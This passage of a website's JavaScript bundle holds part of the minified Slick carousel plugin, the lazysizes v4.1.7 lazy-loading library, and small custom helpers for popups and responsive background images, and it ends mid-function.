m=d(this),g=d(this).attr("data-lazy"),f=document.createElement("img");f.onload=function(){m.animate({opacity:0},100,function(){m.attr("src",g).animate({opacity:1},200,function(){m.removeAttr("data-lazy").removeClass("slick-loading")}),a.$slider.trigger("lazyLoaded",[a,m,g])})},f.onerror=function(){m.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error"),a.$slider.trigger("lazyLoadError",[a,m,g])},f.src=g})}var l,k,j,i,a=this;a.options.centerMode===!0?a.options.infinite===!0?(j=a.currentSlide+(a.options.slidesToShow/2+1),i=j+a.options.slidesToShow+2):(j=Math.max(0,a.currentSlide-(a.options.slidesToShow/2+1)),i=2+(a.options.slidesToShow/2+1)+a.currentSlide):(j=a.options.infinite?a.options.slidesToShow+a.currentSlide:a.currentSlide,i=Math.ceil(j+a.options.slidesToShow),a.options.fade===!0&&(j>0&&j--,i<=a.slideCount&&i++)),l=a.$slider.find(".slick-slide").slice(j,i),h(l),a.slideCount<=a.options.slidesToShow?(k=a.$slider.find(".slick-slide"),h(k)):a.currentSlide>=a.slideCount-a.options.slidesToShow?(k=a.$slider.find(".slick-cloned").slice(0,a.options.slidesToShow),h(k)):0===a.currentSlide&&(k=a.$slider.find(".slick-cloned").slice(-1*a.options.slidesToShow),h(k))},c.prototype.loadSlider=function(){var b=this;b.setPosition(),b.$slideTrack.css({opacity:1}),b.$slider.removeClass("slick-loading"),b.initUI(),"progressive"===b.options.lazyLoad&&b.progressiveLazyLoad()},c.prototype.next=c.prototype.slickNext=function(){var b=this;b.changeSlide({data:{message:"next"}})},c.prototype.orientationChange=function(){var b=this;b.checkResponsive(),b.setPosition()},c.prototype.pause=c.prototype.slickPause=function(){var b=this;b.autoPlayClear(),b.paused=!0},c.prototype.play=c.prototype.slickPlay=function(){var b=this;b.autoPlay(),b.options.autoplay=!0,b.paused=!1,b.focussed=!1,b.interrupted=!1},c.prototype.postSlide=function(f){var e=this;e.unslicked||(e.$slider.trigger("afterChange",[e,f]),e.animating=!1,e.setPosition(),e.swipeLeft=null,e.options.autoplay&&e.autoPlay(),e.options.accessibility===!0&&e.initADA())},c.prototype.prev=c.prototype.slickPrev=function(){var b=this;b.changeSlide({data:{message:"previous"}})},c.prototype.preventDefault=function(b){b.preventDefault()},c.prototype.progressiveLazyLoad=function(a){a=a||1;var j,i,h,l=this,k=d("img[data-lazy]",l.$slider);k.length?(j=k.first(),i=j.attr("data-lazy"),h=document.createElement("img"),h.onload=function(){j.attr("src",i).removeAttr("data-lazy").removeClass("slick-loading"),l.options.adaptiveHeight===!0&&l.setPosition(),l.$slider.trigger("lazyLoaded",[l,j,i]),l.progressiveLazyLoad()},h.onerror=function(){3>a?setTimeout(function(){l.progressiveLazyLoad(a+1)},500):(j.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error"),l.$slider.trigger("lazyLoadError",[l,j,i]),l.progressiveLazyLoad())},h.src=i):l.$slider.trigger("allImagesLoaded",[l])},c.prototype.refresh=function(a){var g,f,h=this;f=h.slideCount-h.options.slidesToShow,!h.options.infinite&&h.currentSlide>f&&(h.currentSlide=f),h.slideCount<=h.options.slidesToShow&&(h.currentSlide=0),g=h.currentSlide,h.destroy(!0),d.extend(h,h.initials,{currentSlide:g}),h.init(),a||h.changeSlide({data:{message:"index",index:g}},!1)},c.prototype.registerBreakpoints=function(){var j,i,h,a=this,g=a.options.responsive||null;if("array"===d.type(g)&&g.length){a.respondTo=a.options.respondTo||"window";for(j in g){if(h=a.breakpoints.length-1,i=g[j].breakpoint,g.hasOwnProperty(j)){for(;h>=0;){a.breakpoints[h]&&a.breakpoints[h]===i&&a.breakpoints.splice(h,1),h--}a.breakpoints.push(i),a.breakpointSettings[i]=g[j].settings}}a.breakpoints.sort(function(b,e){return a.options.mobileFirst?b-e:e-b})}},c.prototype.reinit=function(){var a=this;a.$slides=a.$slideTrack.children(a.options.slide).addClass("slick-slide"),a.slideCount=a.$slides.length,a.currentSlide>=a.slideCount&&0!==a.currentSlide&&(a.currentSlide=a.currentSlide-a.options.slidesToScroll),a.slideCount<=a.options.slidesToShow&&(a.currentSlide=0),a.registerBreakpoints(),a.setProps(),a.setupInfinite(),a.buildArrows(),a.updateArrows(),a.initArrowEvents(),a.buildDots(),a.updateDots(),a.initDotEvents(),a.cleanUpSlideEvents(),a.initSlideEvents(),a.checkResponsive(!1,!0),a.options.focusOnSelect===!0&&d(a.$slideTrack).children().on("click.slick",a.selectHandler),a.setSlideClasses("number"==typeof a.currentSlide?a.currentSlide:0),a.setPosition(),a.focusHandler(),a.paused=!a.options.autoplay,a.autoPlay(),a.$slider.trigger("reInit",[a])},c.prototype.resize=function(){var a=this;d(window).width()!==a.windowWidth&&(clearTimeout(a.windowDelay),a.windowDelay=window.setTimeout(function(){a.windowWidth=d(window).width(),a.checkResponsive(),a.unslicked||a.setPosition()},50))},c.prototype.removeSlide=c.prototype.slickRemove=function(f,e,h){var g=this;return"boolean"==typeof f?(e=f,f=e===!0?0:g.slideCount-1):f=e===!0?--f:f,g.slideCount<1||0>f||f>g.slideCount-1?!1:(g.unload(),h===!0?g.$slideTrack.children().remove():g.$slideTrack.children(this.options.slide).eq(f).remove(),g.$slides=g.$slideTrack.children(this.options.slide),g.$slideTrack.children(this.options.slide).detach(),g.$slideTrack.append(g.$slides),g.$slidesCache=g.$slides,void g.reinit())},c.prototype.setCSS=function(g){var i,h,f=this,j={};f.options.rtl===!0&&(g=-g),i="left"==f.positionProp?Math.ceil(g)+"px":"0px",h="top"==f.positionProp?Math.ceil(g)+"px":"0px",j[f.positionProp]=g,f.transformsEnabled===!1?f.$slideTrack.css(j):(j={},f.cssTransitions===!1?(j[f.animType]="translate("+i+", "+h+")",f.$slideTrack.css(j)):(j[f.animType]="translate3d("+i+", "+h+", 0px)",f.$slideTrack.css(j)))},c.prototype.setDimensions=function(){var f=this;f.options.vertical===!1?f.options.centerMode===!0&&f.$list.css({padding:"0px "+f.options.centerPadding}):(f.$list.height(f.$slides.first().outerHeight(!0)*f.options.slidesToShow),f.options.centerMode===!0&&f.$list.css({padding:f.options.centerPadding+" 0px"})),f.listWidth=f.$list.width(),f.listHeight=f.$list.height(),f.options.vertical===!1&&f.options.variableWidth===!1?(f.slideWidth=Math.ceil(f.listWidth/f.options.slidesToShow),f.$slideTrack.width(Math.ceil(f.slideWidth*f.$slideTrack.children(".slick-slide").length))):f.options.variableWidth===!0?f.$slideTrack.width(5000*f.slideCount):(f.slideWidth=Math.ceil(f.listWidth),f.$slideTrack.height(Math.ceil(f.$slides.first().outerHeight(!0)*f.$slideTrack.children(".slick-slide").length)));var e=f.$slides.first().outerWidth(!0)-f.$slides.first().width();f.options.variableWidth===!1&&f.$slideTrack.children(".slick-slide").width(f.slideWidth-e)},c.prototype.setFade=function(){var e,a=this;a.$slides.each(function(f,b){e=a.slideWidth*f*-1,a.options.rtl===!0?d(b).css({position:"relative",right:e,top:0,zIndex:a.options.zIndex-2,opacity:0}):d(b).css({position:"relative",left:e,top:0,zIndex:a.options.zIndex-2,opacity:0})}),a.$slides.eq(a.currentSlide).css({zIndex:a.options.zIndex-1,opacity:1})},c.prototype.setHeight=function(){var f=this;if(1===f.options.slidesToShow&&f.options.adaptiveHeight===!0&&f.options.vertical===!1){var e=f.$slides.eq(f.currentSlide).outerHeight(!0);f.$list.css("height",e)}},c.prototype.setOption=c.prototype.slickSetOption=function(){var n,m,l,k,i,a=this,j=!1;if("object"===d.type(arguments[0])?(l=arguments[0],j=arguments[1],i="multiple"):"string"===d.type(arguments[0])&&(l=arguments[0],k=arguments[1],j=arguments[2],"responsive"===arguments[0]&&"array"===d.type(arguments[1])?i="responsive":"undefined"!=typeof arguments[1]&&(i="single")),"single"===i){a.options[l]=k}else{if("multiple"===i){d.each(l,function(b,e){a.options[b]=e})}else{if("responsive"===i){for(m in k){if("array"!==d.type(a.options.responsive)){a.options.responsive=[k[m]]}else{for(n=a.options.responsive.length-1;n>=0;){a.options.responsive[n].breakpoint===k[m].breakpoint&&a.options.responsive.splice(n,1),n--}a.options.responsive.push(k[m])}}}}}j&&(a.unload(),a.reinit())},c.prototype.setPosition=function(){var b=this;b.setDimensions(),b.setHeight(),b.options.fade===!1?b.setCSS(b.getLeft(b.currentSlide)):b.setFade(),b.$slider.trigger("setPosition",[b])},c.prototype.setProps=function(){var f=this,e=document.body.style;f.positionProp=f.options.vertical===!0?"top":"left","top"===f.positionProp?f.$slider.addClass("slick-vertical"):f.$slider.removeClass("slick-vertical"),(void 0!==e.WebkitTransition||void 0!==e.MozTransition||void 0!==e.msTransition)&&f.options.useCSS===!0&&(f.cssTransitions=!0),f.options.fade&&("number"==typeof f.options.zIndex?f.options.zIndex<3&&(f.options.zIndex=3):f.options.zIndex=f.defaults.zIndex),void 0!==e.OTransform&&(f.animType="OTransform",f.transformType="-o-transform",f.transitionType="OTransition",void 0===e.perspectiveProperty&&void 0===e.webkitPerspective&&(f.animType=!1)),void 0!==e.MozTransform&&(f.animType="MozTransform",f.transformType="-moz-transform",f.transitionType="MozTransition",void 0===e.perspectiveProperty&&void 0===e.MozPerspective&&(f.animType=!1)),void 0!==e.webkitTransform&&(f.animType="webkitTransform",f.transformType="-webkit-transform",f.transitionType="webkitTransition",void 0===e.perspectiveProperty&&void 0===e.webkitPerspective&&(f.animType=!1)),void 0!==e.msTransform&&(f.animType="msTransform",f.transformType="-ms-transform",f.transitionType="msTransition",void 0===e.msTransform&&(f.animType=!1)),void 0!==e.transform&&f.animType!==!1&&(f.animType="transform",f.transformType="transform",f.transitionType="transition"),f.transformsEnabled=f.options.useTransform&&null!==f.animType&&f.animType!==!1},c.prototype.setSlideClasses=function(h){var l,k,j,i,g=this;k=g.$slider.find(".slick-slide").removeClass("slick-active slick-center slick-current").attr("aria-hidden","true"),g.$slides.eq(h).addClass("slick-current"),g.options.centerMode===!0?(l=Math.floor(g.options.slidesToShow/2),g.options.infinite===!0&&(h>=l&&h<=g.slideCount-1-l?g.$slides.slice(h-l,h+l+1).addClass("slick-active").attr("aria-hidden","false"):(j=g.options.slidesToShow+h,k.slice(j-l+1,j+l+2).addClass("slick-active").attr("aria-hidden","false")),0===h?k.eq(k.length-1-g.options.slidesToShow).addClass("slick-center"):h===g.slideCount-1&&k.eq(g.options.slidesToShow).addClass("slick-center")),g.$slides.eq(h).addClass("slick-center")):h>=0&&h<=g.slideCount-g.options.slidesToShow?g.$slides.slice(h,h+g.options.slidesToShow).addClass("slick-active").attr("aria-hidden","false"):k.length<=g.options.slidesToShow?k.addClass("slick-active").attr("aria-hidden","false"):(i=g.slideCount%g.options.slidesToShow,j=g.options.infinite===!0?g.options.slidesToShow+h:h,g.options.slidesToShow==g.options.slidesToScroll&&g.slideCount-h<g.options.slidesToShow?k.slice(j-(g.options.slidesToShow-i),j+i).addClass("slick-active").attr("aria-hidden","false"):k.slice(j,j+g.options.slidesToShow).addClass("slick-active").attr("aria-hidden","false")),"ondemand"===g.options.lazyLoad&&g.lazyLoad()},c.prototype.setupInfinite=function(){var h,g,f,a=this;if(a.options.fade===!0&&(a.options.centerMode=!1),a.options.infinite===!0&&a.options.fade===!1&&(g=null,a.slideCount>a.options.slidesToShow)){for(f=a.options.centerMode===!0?a.options.slidesToShow+1:a.options.slidesToShow,h=a.slideCount;h>a.slideCount-f;h-=1){g=h-1,d(a.$slides[g]).clone(!0).attr("id","").attr("data-slick-index",g-a.slideCount).prependTo(a.$slideTrack).addClass("slick-cloned")}for(h=0;f>h;h+=1){g=h,d(a.$slides[g]).clone(!0).attr("id","").attr("data-slick-index",g+a.slideCount).appendTo(a.$slideTrack).addClass("slick-cloned")}a.$slideTrack.find(".slick-cloned").find("[id]").each(function(){d(this).attr("id","")})}},c.prototype.interrupt=function(f){var e=this;f||e.autoPlay(),e.interrupted=f},c.prototype.selectHandler=function(a){var h=this,g=d(a.target).is(".slick-slide")?d(a.target):d(a.target).parents(".slick-slide"),f=parseInt(g.attr("data-slick-index"));return f||(f=0),h.slideCount<=h.options.slidesToShow?(h.setSlideClasses(f),void h.asNavFor(f)):void h.slideHandler(f)},c.prototype.slideHandler=function(t,s,r){var q,p,o,n,k,m=null,l=this;return s=s||!1,l.animating===!0&&l.options.waitForAnimate===!0||l.options.fade===!0&&l.currentSlide===t||l.slideCount<=l.options.slidesToShow?void 0:(s===!1&&l.asNavFor(t),q=t,m=l.getLeft(q),n=l.getLeft(l.currentSlide),l.currentLeft=null===l.swipeLeft?n:l.swipeLeft,l.options.infinite===!1&&l.options.centerMode===!1&&(0>t||t>l.getDotCount()*l.options.slidesToScroll)?void (l.options.fade===!1&&(q=l.currentSlide,r!==!0?l.animateSlide(n,function(){l.postSlide(q)}):l.postSlide(q))):l.options.infinite===!1&&l.options.centerMode===!0&&(0>t||t>l.slideCount-l.options.slidesToScroll)?void (l.options.fade===!1&&(q=l.currentSlide,r!==!0?l.animateSlide(n,function(){l.postSlide(q)}):l.postSlide(q))):(l.options.autoplay&&clearInterval(l.autoPlayTimer),p=0>q?l.slideCount%l.options.slidesToScroll!==0?l.slideCount-l.slideCount%l.options.slidesToScroll:l.slideCount+q:q>=l.slideCount?l.slideCount%l.options.slidesToScroll!==0?0:q-l.slideCount:q,l.animating=!0,l.$slider.trigger("beforeChange",[l,l.currentSlide,p]),o=l.currentSlide,l.currentSlide=p,l.setSlideClasses(l.currentSlide),l.options.asNavFor&&(k=l.getNavTarget(),k=k.slick("getSlick"),k.slideCount<=k.options.slidesToShow&&k.setSlideClasses(l.currentSlide)),l.updateDots(),l.updateArrows(),l.options.fade===!0?(r!==!0?(l.fadeSlideOut(o),l.fadeSlide(p,function(){l.postSlide(p)})):l.postSlide(p),void l.animateHeight()):void (r!==!0?l.animateSlide(m,function(){l.postSlide(p)}):l.postSlide(p))))},c.prototype.startLoad=function(){var b=this;b.options.arrows===!0&&b.slideCount>b.options.slidesToShow&&(b.$prevArrow.hide(),b.$nextArrow.hide()),b.options.dots===!0&&b.slideCount>b.options.slidesToShow&&b.$dots.hide(),b.$slider.addClass("slick-loading")},c.prototype.swipeDirection=function(){var g,f,j,i,h=this;return g=h.touchObject.startX-h.touchObject.curX,f=h.touchObject.startY-h.touchObject.curY,j=Math.atan2(f,g),i=Math.round(180*j/Math.PI),0>i&&(i=360-Math.abs(i)),45>=i&&i>=0?h.options.rtl===!1?"left":"right":360>=i&&i>=315?h.options.rtl===!1?"left":"right":i>=135&&225>=i?h.options.rtl===!1?"right":"left":h.options.verticalSwiping===!0?i>=35&&135>=i?"down":"up":"vertical"},c.prototype.swipeEnd=function(f){var h,g,e=this;if(e.dragging=!1,e.interrupted=!1,e.shouldClick=e.touchObject.swipeLength>10?!1:!0,void 0===e.touchObject.curX){return !1}if(e.touchObject.edgeHit===!0&&e.$slider.trigger("edge",[e,e.swipeDirection()]),e.touchObject.swipeLength>=e.touchObject.minSwipe){switch(g=e.swipeDirection()){case"left":case"down":h=e.options.swipeToSlide?e.checkNavigable(e.currentSlide+e.getSlideCount()):e.currentSlide+e.getSlideCount(),e.currentDirection=0;break;case"right":case"up":h=e.options.swipeToSlide?e.checkNavigable(e.currentSlide-e.getSlideCount()):e.currentSlide-e.getSlideCount(),e.currentDirection=1}"vertical"!=g&&(e.slideHandler(h),e.touchObject={},e.$slider.trigger("swipe",[e,g]))}else{e.touchObject.startX!==e.touchObject.curX&&(e.slideHandler(e.currentSlide),e.touchObject={})}},c.prototype.swipeHandler=function(f){var e=this;if(!(e.options.swipe===!1||"ontouchend" in document&&e.options.swipe===!1||e.options.draggable===!1&&-1!==f.type.indexOf("mouse"))){switch(e.touchObject.fingerCount=f.originalEvent&&void 0!==f.originalEvent.touches?f.originalEvent.touches.length:1,e.touchObject.minSwipe=e.listWidth/e.options.touchThreshold,e.options.verticalSwiping===!0&&(e.touchObject.minSwipe=e.listHeight/e.options.touchThreshold),f.data.action){case"start":e.swipeStart(f);break;case"move":e.swipeMove(f);break;case"end":e.swipeEnd(f)}}},c.prototype.swipeMove=function(j){var o,n,m,l,k,i=this;return k=void 0!==j.originalEvent?j.originalEvent.touches:null,!i.dragging||k&&1!==k.length?!1:(o=i.getLeft(i.currentSlide),i.touchObject.curX=void 0!==k?k[0].pageX:j.clientX,i.touchObject.curY=void 0!==k?k[0].pageY:j.clientY,i.touchObject.swipeLength=Math.round(Math.sqrt(Math.pow(i.touchObject.curX-i.touchObject.startX,2))),i.options.verticalSwiping===!0&&(i.touchObject.swipeLength=Math.round(Math.sqrt(Math.pow(i.touchObject.curY-i.touchObject.startY,2)))),n=i.swipeDirection(),"vertical"!==n?(void 0!==j.originalEvent&&i.touchObject.swipeLength>4&&j.preventDefault(),l=(i.options.rtl===!1?1:-1)*(i.touchObject.curX>i.touchObject.startX?1:-1),i.options.verticalSwiping===!0&&(l=i.touchObject.curY>i.touchObject.startY?1:-1),m=i.touchObject.swipeLength,i.touchObject.edgeHit=!1,i.options.infinite===!1&&(0===i.currentSlide&&"right"===n||i.currentSlide>=i.getDotCount()&&"left"===n)&&(m=i.touchObject.swipeLength*i.options.edgeFriction,i.touchObject.edgeHit=!0),i.options.vertical===!1?i.swipeLeft=o+m*l:i.swipeLeft=o+m*(i.$list.height()/i.listWidth)*l,i.options.verticalSwiping===!0&&(i.swipeLeft=o+m*l),i.options.fade===!0||i.options.touchMove===!1?!1:i.animating===!0?(i.swipeLeft=null,!1):void i.setCSS(i.swipeLeft)):void 0)},c.prototype.swipeStart=function(f){var g,e=this;return e.interrupted=!0,1!==e.touchObject.fingerCount||e.slideCount<=e.options.slidesToShow?(e.touchObject={},!1):(void 0!==f.originalEvent&&void 0!==f.originalEvent.touches&&(g=f.originalEvent.touches[0]),e.touchObject.startX=e.touchObject.curX=void 0!==g?g.pageX:f.clientX,e.touchObject.startY=e.touchObject.curY=void 0!==g?g.pageY:f.clientY,void (e.dragging=!0))},c.prototype.unfilterSlides=c.prototype.slickUnfilter=function(){var b=this;null!==b.$slidesCache&&(b.unload(),b.$slideTrack.children(this.options.slide).detach(),b.$slidesCache.appendTo(b.$slideTrack),b.reinit())},c.prototype.unload=function(){var a=this;d(".slick-cloned",a.$slider).remove(),a.$dots&&a.$dots.remove(),a.$prevArrow&&a.htmlExpr.test(a.options.prevArrow)&&a.$prevArrow.remove(),a.$nextArrow&&a.htmlExpr.test(a.options.nextArrow)&&a.$nextArrow.remove(),a.$slides.removeClass("slick-slide slick-active slick-visible slick-current").attr("aria-hidden","true").css("width","")},c.prototype.unslick=function(f){var e=this;e.$slider.trigger("unslick",[e,f]),e.destroy()},c.prototype.updateArrows=function(){var e,f=this;e=Math.floor(f.options.slidesToShow/2),f.options.arrows===!0&&f.slideCount>f.options.slidesToShow&&!f.options.infinite&&(f.$prevArrow.removeClass("slick-disabled").attr("aria-disabled","false"),f.$nextArrow.removeClass("slick-disabled").attr("aria-disabled","false"),0===f.currentSlide?(f.$prevArrow.addClass("slick-disabled").attr("aria-disabled","true"),f.$nextArrow.removeClass("slick-disabled").attr("aria-disabled","false")):f.currentSlide>=f.slideCount-f.options.slidesToShow&&f.options.centerMode===!1?(f.$nextArrow.addClass("slick-disabled").attr("aria-disabled","true"),f.$prevArrow.removeClass("slick-disabled").attr("aria-disabled","false")):f.currentSlide>=f.slideCount-1&&f.options.centerMode===!0&&(f.$nextArrow.addClass("slick-disabled").attr("aria-disabled","true"),f.$prevArrow.removeClass("slick-disabled").attr("aria-disabled","false")))},c.prototype.updateDots=function(){var b=this;null!==b.$dots&&(b.$dots.find("li").removeClass("slick-active").attr("aria-hidden","true"),b.$dots.find("li").eq(Math.floor(b.currentSlide/b.options.slidesToScroll)).addClass("slick-active").attr("aria-hidden","false"))},c.prototype.visibility=function(){var b=this;b.options.autoplay&&(document[b.hidden]?b.interrupted=!0:b.interrupted=!1)},d.fn.slick=function(){var i,h,b=this,l=arguments[0],k=Array.prototype.slice.call(arguments,1),j=b.length;for(i=0;j>i;i++){if("object"==typeof l||"undefined"==typeof l?b[i].slick=new c(b[i],l):h=b[i].slick[l].apply(b[i].slick,k),"undefined"!=typeof h){return h}}return b}});

/*! lazysizes - v4.1.7 https://github.com/aFarkas/lazysizes  */ 
!function(e,d){var f=d(e,e.document);e.lazySizes=f,"object"==typeof module&&module.exports&&(module.exports=f)}(window,function(al,ak){if(ak.getElementsByClassName){var aj,ai,ah=ak.documentElement,ag=al.Date,af=al.HTMLPictureElement,ae="addEventListener",ad="getAttribute",ac=al[ae],ab=al.setTimeout,aa=al.requestAnimationFrame||ab,Z=al.requestIdleCallback,Y=/^picture$/i,X=["load","error","lazyincluded","_lazyloaded"],W={},U=Array.prototype.forEach,S=function(d,c){return W[c]||(W[c]=new RegExp("(\\s|^)"+c+"(\\s|$)")),W[c].test(d[ad]("class")||"")&&W[c]},Q=function(d,c){S(d,c)||d.setAttribute("class",(d[ad]("class")||"").trim()+" "+c)},O=function(e,d){var f;(f=S(e,d))&&e.setAttribute("class",(e[ad]("class")||"").replace(f," "))},M=function(f,e,h){var g=h?ae:"removeEventListener";h&&M(f,e),X.forEach(function(a){f[g](a,e)})},K=function(b,l,k,j,i){var c=ak.createEvent("Event");return k||(k={}),k.instance=aj,c.initEvent(l,!j,!i),c.detail=k,b.dispatchEvent(c),c},J=function(a,f){var d;!af&&(d=al.picturefill||ai.pf)?(f&&f.src&&!a[ad]("srcset")&&a.setAttribute("srcset",f.src),d({reevaluate:!0,elements:[a]})):f&&f.src&&(a.src=f.src)},I=function(d,c){return(getComputedStyle(d,null)||{})[c]},H=function(e,d,f){for(f=f||e.offsetWidth;f<ai.minSize&&d&&!e._lazysizesWidth;){f=d.offsetWidth,d=d.parentNode}return f},G=function(){var b,n,m=[],l=[],k=m,j=function(){var a=k;for(k=m.length?l:m,b=!0,n=!1;a.length;){a.shift()()}b=!1},i=function(c,a){b&&!a?c.apply(this,arguments):(k.push(c),n||(n=!0,(ak.hidden?ab:aa)(j)))};return i._lsFlush=j,i}(),V=function(d,c){return c?function(){G(d)}:function(){var a=this,e=arguments;G(function(){d.apply(a,e)})}},T=function(f){var d,n=0,m=ai.throttleDelay,l=ai.ricTimeout,k=function(){d=!1,n=ag.now(),f()},j=Z&&l>49?function(){Z(k,{timeout:l}),l!==ai.ricTimeout&&(l=ai.ricTimeout)}:V(function(){ab(k)},!0);return function(b){var c;(b=!0===b)&&(l=33),d||(d=!0,c=m-(ag.now()-n),c<0&&(c=0),b||c<9?j():ab(j,c))}},R=function(h){var f,l,k=99,j=function(){f=null,h()},i=function(){var b=ag.now()-l;b<k?ab(i,k-b):(Z||j)(j)};return function(){l=ag.now(),f||(f=ab(i,k))}};!function(){var a,d={lazyClass:"lazyload",loadedClass:"lazyloaded",loadingClass:"lazyloading",preloadClass:"lazypreload",errorClass:"lazyerror",autosizesClass:"lazyautosizes",srcAttr:"data-src",srcsetAttr:"data-srcset",sizesAttr:"data-sizes",minSize:40,customMedia:{},init:!0,expFactor:1.5,hFac:0.8,loadMode:2,loadHidden:!0,ricTimeout:0,throttleDelay:125};ai=al.lazySizesConfig||al.lazysizesConfig||{};for(a in d){a in ai||(ai[a]=d[a])}al.lazySizesConfig=ai,ab(function(){ai.init&&L()})}();var P=function(){var ar,aq,ap,ao,an,z,am,E,C,B,A,x,w=/^img$/i,v=/^iframe$/i,u="onscroll" in al&&!/(gle|ing)bot/.test(navigator.userAgent),t=0,s=0,r=0,n=-1,k=function(g){r--,(!g||r<0||!g.target)&&(r=0)},j=function(g){return null==x&&(x="hidden"==I(ak.body,"visibility")),x||"hidden"!=I(g.parentNode,"visibility")&&"hidden"!=I(g,"visibility")},h=function(l,y){var p,o=l,m=j(l);for(E-=y,A+=y,C-=y,B+=y;m&&(o=o.offsetParent)&&o!=ak.body&&o!=ah;){(m=(I(o,"opacity")||1)>0)&&"visible"!=I(o,"overflow")&&(p=o.getBoundingClientRect(),m=B>p.left&&C<p.right&&A>p.top-1&&E<p.bottom+1)}return m},f=function(){var ay,ax,aw,av,F,D,y,o,l,g,aB,aA,az=aj.elements;if((ao=ai.loadMode)&&r<8&&(ay=az.length)){for(ax=0,n++,g=!ai.expand||ai.expand<1?ah.clientHeight>500&&ah.clientWidth>500?500:370:ai.expand,aj._defEx=g,aB=g*ai.expFactor,aA=ai.hFac,x=null,s<aB&&r<1&&n>2&&ao>2&&!ak.hidden?(s=aB,n=0):s=ao>1&&n>1&&r<6?g:t;ax<ay;ax++){if(az[ax]&&!az[ax]._lazyRace){if(u){if((o=az[ax][ad]("data-expand"))&&(D=1*o)||(D=s),l!==D&&(z=innerWidth+D*aA,am=innerHeight+D,y=-1*D,l=D),aw=az[ax].getBoundingClientRect(),(A=aw.bottom)>=y&&(E=aw.top)<=am&&(B=aw.right)>=y*aA&&(C=aw.left)<=z&&(A||B||C||E)&&(ai.loadHidden||j(az[ax]))&&(aq&&r<3&&!o&&(ao<3||n<4)||h(az[ax],D))){if(at(az[ax]),F=!0,r>9){break}}else{!F&&aq&&!av&&r<4&&n<4&&ao>2&&(ar[0]||ai.preloadAfterLoad)&&(ar[0]||!o&&(A||B||C||E||"auto"!=az[ax][ad](ai.sizesAttr)))&&(av=ar[0]||az[ax])}}else{at(az[ax])}}}av&&!F&&at(av)}},e=T(f),d=function(l){var g=l.target;if(g._lazyCache){return void delete g._lazyCache}k(l),Q(g,ai.loadedClass),O(g,ai.loadingClass),M(g,b),K(g,"lazyloaded")},c=V(d),b=function(g){c({target:g.target})},a=function(l,g){try{l.contentWindow.location.replace(g)}catch(m){l.src=g}},i=function(l){var g,m=l[ad](ai.srcsetAttr);(g=ai.customMedia[l[ad]("data-media")||l[ad]("media")])&&l.setAttribute("media",g),m&&l.setAttribute("srcset",m)},au=V(function(aB,aA,az,ay,ax){var aw,av,F,D,y,m;(y=K(aB,"lazybeforeunveil",aA)).defaultPrevented||(ay&&(az?Q(aB,ai.autosizesClass):aB.setAttribute("sizes",ay)),av=aB[ad](ai.srcsetAttr),aw=aB[ad](ai.srcAttr),ax&&(F=aB.parentNode,D=F&&Y.test(F.nodeName||"")),m=aA.firesLoad||"src" in aB&&(av||aw||D),y={target:aB},Q(aB,ai.loadingClass),m&&(clearTimeout(ap),ap=ab(k,2500),M(aB,b,!0)),D&&U.call(F.getElementsByTagName("source"),i),av?aB.setAttribute("srcset",av):aw&&!D&&(v.test(aB.nodeName)?a(aB,aw):aB.src=aw),ax&&(av||D)&&J(aB,{src:aw})),aB._lazyRace&&delete aB._lazyRace,O(aB,ai.lazyClass),G(function(){(!m||aB.complete&&aB.naturalWidth>1)&&(d(y),aB._lazyCache=!0,ab(function(){"_lazyCache" in aB&&delete aB._lazyCache},9))},!0)}),at=function(l){var g,p=w.test(l.nodeName),o=p&&(l[ad](ai.sizesAttr)||l[ad]("sizes")),m="auto"==o;(!m&&aq||!p||!l[ad]("src")&&!l.srcset||l.complete||S(l,ai.errorClass)||!S(l,ai.lazyClass))&&(g=K(l,"lazyunveilread").detail,m&&N.updateElem(l,!0,l.offsetWidth),l._lazyRace=!0,r++,au(l,g,m,o,p))},q=function(){if(!aq){if(ag.now()-an<999){return void ab(q,999)}var g=R(function(){ai.loadMode=3,e()});aq=!0,ai.loadMode=3,e(),ac("scroll",function(){3==ai.loadMode&&(ai.loadMode=2),g()},!0)}};return{_:function(){an=ag.now(),aj.elements=ak.getElementsByClassName(ai.lazyClass),ar=ak.getElementsByClassName(ai.lazyClass+" "+ai.preloadClass),ac("scroll",e,!0),ac("resize",e,!0),al.MutationObserver?new MutationObserver(e).observe(ah,{childList:!0,subtree:!0,attributes:!0}):(ah[ae]("DOMNodeInserted",e,!0),ah[ae]("DOMAttrModified",e,!0),setInterval(e,999)),ac("hashchange",e,!0),["focus","mouseover","click","load","transitionend","animationend","webkitAnimationEnd"].forEach(function(g){ak[ae](g,e,!0)}),/d$|^c/.test(ak.readyState)?q():(ac("load",q),ak[ae]("DOMContentLoaded",e),ab(q,20000)),aj.elements.length?(f(),G._lsFlush()):e()},checkElems:e,unveil:at}}(),N=function(){var b,j=V(function(l,k,q,p){var o,n,m;if(l._lazysizesWidth=p,p+="px",l.setAttribute("sizes",p),Y.test(k.nodeName||"")){for(o=k.getElementsByTagName("source"),n=0,m=o.length;n<m;n++){o[n].setAttribute("sizes",p)}}q.detail.dataAttr||J(l,q.detail)}),i=function(g,c,m){var l,k=g.parentNode;k&&(m=H(g,k,m),l=K(g,"lazybeforesizes",{width:m,dataAttr:!!c}),l.defaultPrevented||(m=l.detail.width)&&m!==g._lazysizesWidth&&j(g,k,l,m))},h=function(){var a,e=b.length;if(e){for(a=0;a<e;a++){i(b[a])}}},d=R(h);return{_:function(){b=ak.getElementsByClassName(ai.autosizesClass),ac("resize",d)},checkElems:d,updateElem:i}}(),L=function(){L.i||(L.i=!0,N._(),P._())};return aj={cfg:ai,autoSizer:N,loader:P,init:L,uP:J,aC:Q,rC:O,hC:S,fire:K,gW:H,rAF:G}}});

function closePopup(id){
	var elements = document.getElementById(id);
	console.log(elements);
	elements.classList.remove("active");	
}
function openPopup(id){
	var elements = document.getElementById(id);
	console.log(elements);
	addClass(elements,"active");	
}
function addClass(element, classname){
    var currentClassList = (element.className || '').split(/\s+/);
    currentClassList
     .push(currentClassList.indexOf(classname) > -1 ? '' : classname);
    element.className = currentClassList.join(' ').trim();
}


/* load new background-image */

/* support for background images: */
document.addEventListener('lazybeforeunveil', function (e) {
	var bg = e.target.getAttribute('data-bg');
	if (bg) e.target.style.backgroundImage = 'url(' + bg + ')';
});

function loadImg(element){
    var bg = '';
	switch (screenW) {
		case  'mobile':
			bg = element.getAttribute('data-bg-mobile');
			if(bg)
				break; 
		case 'tablet':
			bg = element.getAttribute('data-bg-tablet');
			if(bg)
				break; 
		case 'laptop':
